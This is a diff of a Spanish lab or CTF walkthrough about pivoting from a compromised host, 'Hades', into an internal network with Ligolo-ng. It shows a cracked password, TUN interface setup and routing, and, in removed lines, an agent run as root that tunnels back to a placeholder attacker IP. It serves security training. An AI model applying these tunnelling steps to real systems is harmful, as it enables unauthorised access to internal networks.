@@ -112,36 +112,37 @@ El comando utiliza una técnica de "capas" para extraer la credencial en claro. 
 
 **Resultado Final:** `P0seidón2022!`
 
-# 🌊 Segunda Máquina: Poseidón
+### 🖥️ Configuración del Servidor (Proxy) en Máquina Atacante
 
-Tras completar la explotación del nodo **Hades**, el siguiente objetivo es alcanzar la máquina **Poseidón** (`20.20.20.3`). Dado que este host reside en una red interna aislada, utilizaremos **Ligolo-ng** para establecer un túnel y realizar el pivoting.
+Antes de conectar el agente, debemos preparar nuestro entorno local para recibir la conexión y gestionar el tráfico tunelizado.
+
+| Componente | Acción / Comando | Descripción Técnica |
+| :--- | :--- | :--- |
+| **Directorio** | `cd /path/to/ligolo/` | Ubicación del binario del Proxy. |
+| **Ejecución** | `./proxy -selfcert` | Inicia el servidor usando un certificado auto-firmado para cifrar el túnel. |
+| **Puerto Local** | `11601` (Default) | Puerto que quedará a la escucha (Listening) para la conexión del agente. |
 
 ---
 
-## ⚙️ Configuración de Ligolo-ng
+### 🛠️ Configuración de la Interfaz de Red (Networking)
 
-Ligolo-ng nos permite crear una interfaz `TUN` para enrutar el tráfico de forma transparente hacia la red interna.
+Para que nuestro sistema operativo sepa cómo enviar paquetes a la red interna de Poseidón, configuramos una interfaz **TUN**:
 
-### 1. Preparación del Entorno
-Primero, determinamos la arquitectura de **Hades** para elegir el binario adecuado del [repositorio oficial de Ligolo-ng](https://github.com/nicocha30/ligolo-ng).
+| Paso | Comando | Propósito |
+| :--- | :--- | :--- |
+| **1. Crear TUN** | `sudo ip link add dev ligolo type tun` | Crea la interfaz virtual llamada `ligolo`. |
+| **2. Levantar** | `sudo ip link set ligolo up` | Activa la interfaz para que pueda transmitir datos. |
+| **3. Enrutar** | `sudo ip route add 20.20.20.0/24 dev ligolo` | Envía todo el tráfico destinado a la red `20.20.20.x` a través del túnel. |
 
-| Comando en Hades | Resultado | Arquitectura | Binario a usar |
-| :--- | :--- | :--- | :--- |
-| `uname -m` | `x86_64` | **AMD64** | `agent_linux_amd64` |
+---
 
-### 2. Configuración del Atacante (Local)
-En nuestra máquina, preparamos la interfaz de red que recibirá las conexiones:
+### 🔗 Sincronización Agente-Proxy
 
-| Acción | Comando |
-| :--- | :--- |
-| **Iniciar Proxy** | `./proxy -selfcert` |
-| **Crear Interfaz** | `sudo ip link add dev ligolo type tun` |
-| **Levantar Interfaz** | `sudo ip link set ligolo up` |
+Una vez que el agente se conecta desde Hades, la consola del Proxy mostrará un aviso de conexión. Debes seguir este flujo para activar el túnel:
 
-### 3. Establecimiento del Túnel
-Desde la máquina **Hades** (actuando como root), ejecutamos el agente para conectar con nuestro proxy:
+1. **Seleccionar Sesión:** Escribe `session` y elige el número de ID correspondiente a la conexión de Hades.
+2. **Iniciar Túnel:** Escribe `start` para comenzar el intercambio de paquetes.
 
-```bash
-# En Hades (Root)
-chmod +x agent
-./agent -connect <TU_IP_ATACANTE>:11601 -ignore-cert
+
+
+> **Tip Técnico:** Verifica siempre con `ip route` que la ruta hacia la red `20.20.20.0/24` apunta correctamente a la interfaz `ligolo`. Si no lo haces, intentarás salir por tu puerta de enlace predeterminada (tu router) y no llegarás a Poseidón.
